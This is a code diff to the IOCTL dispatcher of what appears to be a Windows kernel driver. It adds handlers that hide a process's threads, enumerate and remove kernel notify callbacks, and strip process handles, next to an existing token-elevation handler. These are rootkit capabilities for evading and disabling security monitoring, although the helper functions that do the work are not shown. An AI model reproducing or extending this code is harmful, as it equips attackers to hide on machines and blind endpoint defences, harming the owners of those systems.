@@ -3,6 +3,7 @@
 #include "memory.h"
 #include "process.h"
 #include "eprocess.h"
+#include "stealth.h"
 
 /* -----------------------------------------------------------------------
  * Debug print macro — stripped in release builds
@@ -340,6 +341,146 @@ static NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 
 				Response->Status = (LONG)Status;
 				BytesReturned = sizeof( ELEVATE_TOKEN_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_HIDE_THREADS
+		 * --------------------------------------------------------------- */
+		case IOCTL_HIDE_THREADS:
+		{
+			PHIDE_THREADS_REQUEST  Request;
+			PHIDE_THREADS_RESPONSE Response;
+
+			if ( InputLength < sizeof( HIDE_THREADS_REQUEST ) ||
+				 OutputLength < sizeof( HIDE_THREADS_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PHIDE_THREADS_REQUEST)SystemBuffer;
+			Response = (PHIDE_THREADS_RESPONSE)SystemBuffer;
+
+			{
+				ULONG64 Pid = Request->ProcessId;
+				ULONG   Hidden = 0;
+
+				Status = KmHideProcessThreads( (HANDLE)Pid, &Hidden );
+
+				Response->Status = (LONG)Status;
+				Response->ThreadsHidden = Hidden;
+				BytesReturned = sizeof( HIDE_THREADS_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_ENUM_CALLBACKS
+		 * --------------------------------------------------------------- */
+		case IOCTL_ENUM_CALLBACKS:
+		{
+			PENUM_CALLBACKS_REQUEST  Request;
+			PENUM_CALLBACKS_RESPONSE Response;
+
+			if ( InputLength < sizeof( ENUM_CALLBACKS_REQUEST ) ||
+				 OutputLength < sizeof( ENUM_CALLBACKS_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PENUM_CALLBACKS_REQUEST)SystemBuffer;
+			Response = (PENUM_CALLBACKS_RESPONSE)SystemBuffer;
+
+			{
+				ULONG Type  = Request->CallbackType;
+				ULONG Count = 0;
+
+				Status = KmEnumerateNotifyCallbacks(
+					Type,
+					Response->Entries,
+					MAX_CALLBACK_ENTRIES,
+					&Count
+				);
+
+				Response->Status = (LONG)Status;
+				Response->Count  = Count;
+				BytesReturned = sizeof( ENUM_CALLBACKS_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_REMOVE_CALLBACK
+		 * --------------------------------------------------------------- */
+		case IOCTL_REMOVE_CALLBACK:
+		{
+			PREMOVE_CALLBACK_REQUEST  Request;
+			PREMOVE_CALLBACK_RESPONSE Response;
+
+			if ( InputLength < sizeof( REMOVE_CALLBACK_REQUEST ) ||
+				 OutputLength < sizeof( REMOVE_CALLBACK_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PREMOVE_CALLBACK_REQUEST)SystemBuffer;
+			Response = (PREMOVE_CALLBACK_RESPONSE)SystemBuffer;
+
+			{
+				ULONG Type  = Request->CallbackType;
+				ULONG Index = Request->Index;
+
+				Status = KmRemoveNotifyCallback( Type, Index );
+
+				Response->Status = (LONG)Status;
+				BytesReturned = sizeof( REMOVE_CALLBACK_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_STRIP_HANDLES
+		 * --------------------------------------------------------------- */
+		case IOCTL_STRIP_HANDLES:
+		{
+			PSTRIP_HANDLES_REQUEST  Request;
+			PSTRIP_HANDLES_RESPONSE Response;
+
+			if ( InputLength < sizeof( STRIP_HANDLES_REQUEST ) ||
+				 OutputLength < sizeof( STRIP_HANDLES_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PSTRIP_HANDLES_REQUEST)SystemBuffer;
+			Response = (PSTRIP_HANDLES_RESPONSE)SystemBuffer;
+
+			{
+				ULONG64 Pid = Request->ProcessId;
+				ULONG   Stripped = 0;
+
+				Status = KmStripProcessHandles( (HANDLE)Pid, &Stripped );
+
+				Response->Status = (LONG)Status;
+				Response->HandlesStripped = Stripped;
+				BytesReturned = sizeof( STRIP_HANDLES_RESPONSE );
 
 				Status = STATUS_SUCCESS;
 			}
